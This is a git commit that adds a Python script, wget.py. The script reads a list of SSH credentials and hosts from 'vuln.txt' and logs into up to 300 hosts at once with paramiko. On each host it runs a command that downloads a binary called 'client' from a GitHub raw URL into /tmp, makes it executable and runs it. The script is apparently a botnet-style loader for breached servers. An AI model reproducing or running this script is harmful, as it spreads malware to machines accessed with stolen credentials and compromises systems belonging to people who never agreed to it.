1ab32b3ca3ef5187029ef2f7e0f94e49c467cbb8
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-10-13 05:49:17 +0500

    Add files via upload

---
+++ wget.py
@@ -0,0 +1,34 @@
+import paramiko
+from concurrent.futures import ProcessPoolExecutor
+import time
+
+def process_host(credentials):
+    username, password, host = credentials
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        ssh.connect(hostname=host, username=username, password=password)
+        print(f"Connected to --> {host}")
+
+        stdin, stdout, stderr = ssh.exec_command('cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/client; chmod 777 client; ./client')
+
+        time.sleep(10)
+
+        ssh.close()
+
+        print(f"Command Sent To --> {host}")
+
+    except paramiko.AuthenticationException:
+        print(f"Can't Authenticate Host {host}")
+    except Exception as e:
+        print(f"Can't Connect To Host {host}: {str(e)}")
+
+if __name__ == "__main__":
+    with open('vuln.txt', 'r') as file:
+        lines = file.readlines()
+
+    credentials_list = [line.strip().split(':') for line in lines]
+
+    with ProcessPoolExecutor(max_workers=300) as executor:
+        executor.map(process_host, credentials_list)
